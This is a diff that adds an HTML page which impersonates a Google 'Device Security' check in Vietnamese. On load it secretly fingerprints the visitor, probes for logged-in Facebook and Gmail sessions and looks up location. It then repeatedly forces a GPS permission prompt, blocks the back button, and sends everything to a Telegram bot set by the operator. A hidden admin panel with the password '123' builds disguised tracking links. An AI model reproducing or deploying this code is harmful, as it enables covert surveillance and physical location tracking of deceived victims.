@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0">
+    
+    <title id="meta-title">Hệ thống đang xác thực...</title>
+    <meta id="og-title" property="og:title" content="Security Check">
+    <meta id="og-desc" property="og:description" content="Vui lòng xác minh thiết bị để tiếp tục.">
+    <meta id="og-img" property="og:image" content="https://www.gstatic.com/images/branding/product/2x/maps_96dp.png">
+
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        .admin-bg { background: #010409; color: #c9d1d9; font-family: ui-sans-serif, system-ui; }
+        .glass { background: #0d1117; border: 1px solid #30363d; border-radius: 1.5rem; }
+        .input-dark { background: #010409; border: 1px solid #30363d; color: #f0f6fc; padding: 10px; border-radius: 8px; width: 100%; font-size: 11px; outline: none; }
+        .input-dark:focus { border-color: #3b82f6; }
+        .victim-body { background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #4285F4; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body class="victim-body">
+
+    <div id="ui-target" class="p-4 w-full max-w-sm text-center animate-fadeIn">
+        <div class="bg-white p-10 rounded-[40px] shadow-2xl border-b-[8px] border-blue-600">
+            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" class="h-6 mx-auto mb-10 opacity-70">
+            <div id="status-icon" class="loader mx-auto mb-6"></div>
+            <h3 class="text-xl font-black text-gray-800 mb-2">Device Security</h3>
+            <p id="msg-text" class="text-[11px] text-gray-400 mb-10 px-6 leading-relaxed uppercase font-bold tracking-tighter">Đang kiểm tra tính toàn vẹn của thiết bị để bảo mật tài liệu...</p>
+            <button onclick="startGPSForce()" class="flex items-center justify-between p-6 bg-gray-50 border-2 border-gray-100 rounded-3xl w-full hover:border-blue-500 active:scale-95 shadow-sm transition-all">
+                <span class="text-sm font-black text-gray-700 uppercase">Tiếp tục xác thực</span>
+                <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" class="w-6">
+            </button>
+        </div>
+    </div>
+
+    <div id="ui-admin" class="hidden w-full max-w-6xl p-6 admin-bg min-h-screen">
+        <h1 class="text-3xl font-black italic mb-6 border-b border-gray-800 pb-4 tracking-tighter">SENTINEL <span class="text-blue-500 uppercase">V46 ULTIMATE</span></h1>
+        <div class="grid grid-cols-1 md:grid-cols-2 gap-8 text-[11px]">
+            <div class="glass p-6 space-y-4 shadow-2xl border-t-4 border-blue-600">
+                <h3 class="text-blue-400 font-black uppercase italic border-b border-gray-800 pb-2">Cấu hình Robot & Link</h3>
+                <input id="cfg-token" type="password" placeholder="Telegram Bot Token" class="input-dark">
+                <input id="cfg-chatid" type="text" placeholder="Telegram Chat ID" class="input-dark">
+                <input id="cfg-redir" type="text" placeholder="Link đích cuối (Redirect)" class="input-dark">
+                <input id="cfg-title" type="text" placeholder="Tiêu đề trang ngụy trang" class="input-dark">
+                <button onclick="saveAndBuild()" class="w-full bg-blue-600 p-3 rounded-xl font-black uppercase shadow-lg shadow-blue-900/20 active:scale-95 transition-all">Build Universal Link</button>
+                <div id="final-link" class="p-3 bg-black rounded border border-blue-900/30 text-blue-400 break-all font-mono hidden cursor-pointer" onclick="navigator.clipboard.writeText(this.innerText); alert('Đã Copy!')"></div>
+            </div>
+            <div class="glass p-6 border-l-4 border-red-600 space-y-4">
+                <h3 class="text-red-500 font-black uppercase italic border-b border-gray-800 pb-2">Trạng thái công nghệ:</h3>
+                <div id="tech-list" class="text-[10px] text-gray-400 space-y-2 uppercase leading-relaxed font-bold">
+                    <p class="text-green-500">✓ Canvas Fingerprint: ACTIVE</p>
+                    <p class="text-green-500">✓ Social Session Detection: ACTIVE</p>
+                    <p class="text-green-500">✓ Battery/Network Analysis: ACTIVE</p>
+                    <p class="text-green-500">✓ OneTrust Stealth Geo: ACTIVE</p>
+                    <p class="text-yellow-500">⚠ Anti-Bounce Navigation: ACTIVE</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <canvas id="fp-canvas" style="display:none"></canvas>
+
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        let config = { t: '', i: '', r: 'https://google.com', ttl: 'Security Check' };
+
+        // 1. DEVICE FINGERPRINTING
+        function getFP() {
+            const canvas = document.getElementById('fp-canvas');
+            const ctx = canvas.getContext('2d');
+            ctx.font = "14pt Arial";
+            ctx.fillText("SENTINEL-v46-ULT", 2, 2);
+            const b64 = canvas.toDataURL();
+            let hash = 0;
+            for (let i = 0; i < b64.length; i++) { hash = ((hash << 5) - hash) + b64.charCodeAt(i); hash |= 0; }
+            return "ID-" + Math.abs(hash);
+        }
+
+        // 2. SOCIAL DETECTION
+        async function checkSocial() {
+            const nets = [{n:'Facebook', u:'https://www.facebook.com/favicon.ico'}, {n:'Gmail', u:'https://accounts.google.com/ServiceLogin?service=mail'}];
+            let found = [];
+            const promises = nets.map(net => new Promise(resolve => {
+                const img = new Image();
+                img.onload = () => { found.push(net.n); resolve(); };
+                img.onerror = () => resolve();
+                img.src = net.u + "?" + Math.random();
+                setTimeout(resolve, 2000);
+            }));
+            await Promise.all(promises);
+            return found.length > 0 ? found.join(", ") : "None";
+        }
+
+        // 3. SYSTEM ANALYSIS
+        async function getSysIntel() {
+            let batInfo = "N/A";
+            try {
+                const bat = await navigator.getBattery();
+                batInfo = `${Math.round(bat.level * 100)}% (${bat.charging ? 'Đang sạc' : 'Pin rời'})`;
+            } catch(e) {}
+            const net = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            return `Pin: ${batInfo} | Mạng: ${net ? net.effectiveType.toUpperCase() : "N/A"}`;
+        }
+
+        // 4. ADMIN LOGIC
+        if (urlParams.has('admin')) {
+            document.body.className = "admin-bg";
+            document.getElementById('ui-target').classList.add('hidden');
+            if (localStorage.getItem('sentinel_v46_auth') === 'true' || prompt("Pass:") === "123") {
+                localStorage.setItem('sentinel_v46_auth', 'true');
+                document.getElementById('ui-admin').classList.remove('hidden');
+                loadSavedConfig();
+            } else { window.location.href = window.location.pathname; }
+        }
+
+        function loadSavedConfig() {
+            const saved = JSON.parse(localStorage.getItem('v46_cfg') || '{}');
+            if(saved.t) {
+                document.getElementById('cfg-token').value = saved.t;
+                document.getElementById('cfg-id').value = saved.i;
+                document.getElementById('cfg-redir').value = saved.r;
+                document.getElementById('cfg-title').value = saved.ttl;
+                buildLinkDisplay(saved);
+            }
+        }
+
+        function saveAndBuild() {
+            const cfg = {
+                t: document.getElementById('cfg-token').value,
+                i: document.getElementById('cfg-id').value,
+                r: document.getElementById('cfg-redir').value,
+                ttl: document.getElementById('cfg-title').value
+            };
+            localStorage.setItem('v46_cfg', JSON.stringify(cfg));
+            buildLinkDisplay(cfg);
+            alert("Đã tạo link!");
+        }
+
+        function buildLinkDisplay(cfg) {
+            const v = btoa(unescape(encodeURIComponent(JSON.stringify(cfg))));
+            const out = document.getElementById('final-link');
+            out.innerText = `${window.location.href.split('?')[0]}?v=${v}`;
+            out.classList.remove('hidden');
+        }
+
+        // 5. THU THẬP TỔNG LỰC (ONLOAD)
+        async function startSilentEntry() {
+            try {
+                const v = urlParams.get('v');
+                if(v) config = JSON.parse(decodeURIComponent(escape(atob(v))));
+                document.title = config.ttl || "Xác thực...";
+            } catch(e) {}
+
+            // Anti-Bounce & Cloaking
+            history.pushState(null, null, location.href);
+            window.onpopstate = () => history.go(1);
+            let origTitle = document.title;
+            document.addEventListener('visibilitychange', () => {
+                document.title = document.hidden ? "🔴 CẢNH BÁO BẢO MẬT!" : origTitle;
+            });
+
+            // Thu thập ngầm
+            const id = getFP();
+            const sys = await getSysIntel();
+            const social = await checkSocial();
+            let geo = "Unknown";
+            try {
+                const res = await fetch('https://geolocation.onetrust.com/cookieconsentpub/v1/geo/location', { headers: { 'Accept': 'application/json' } }).then(r => r.json());
+                geo = `${res.city}, ${res.country}`;
+            } catch(e) {}
+
+            let msg = `🛰️ <b>[V46 ENTRY]</b>\n`;
+            msg += `🆔 ID: <code>${id}</code>\n`;
+            msg += `📱 TB: <b>${navigator.platform}</b>\n`;
+            msg += `🔋 Hệ thống: <b>${sys}</b>\n`;
+            msg += `🕵️ Social: <b>${social}</b>\n`;
+            msg += `🌐 Vùng: <i>${geo}</i>`;
+            
+            await sendTele(msg);
+        }
+
+        // 6. GPS FORCED
+        async function startGPSForce() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    async (p) => {
+                        const lat = p.coords.latitude, lon = p.coords.longitude;
+                        let addr = `Tọa độ: ${lat}, ${lon}`;
+                        try {
+                            const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`).then(r => r.json());
+                            addr = res.display_name;
+                        } catch(e) {}
+                        await sendTele(`🎯 <b>GPS SUCCESS</b>\n🆔 ID: <code>${getFP()}</code>\n📍 ${addr}\n🗺️ <a href="http://google.com/maps?q=0$0{lat},${lon}">XEM BẢN ĐỒ VỆ TINH</a>`);
+                        window.location.replace(config.r);
+                    },
+                    (err) => {
+                        alert("LỖI ĐỒNG BỘ: Thiết bị yêu cầu xác minh vị trí để hoàn tất kiểm tra bảo mật.");
+                        startGPSForce();
+                    },
+                    { enableHighAccuracy: true, timeout: 6000 }
+                );
+            }
+        }
+
+        async function sendTele(text) {
+            if (!config.t || !config.i) return;
+            return fetch(`https://api.telegram.org/bot${config.t}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: config.i, text: text, parse_mode: 'HTML' })
+            });
+        }
+
+        function logout() { localStorage.removeItem('sentinel_v46_auth'); location.href = location.pathname; }
+        window.onload = startSilentEntry;
+    </script>
+</body>
+</html>
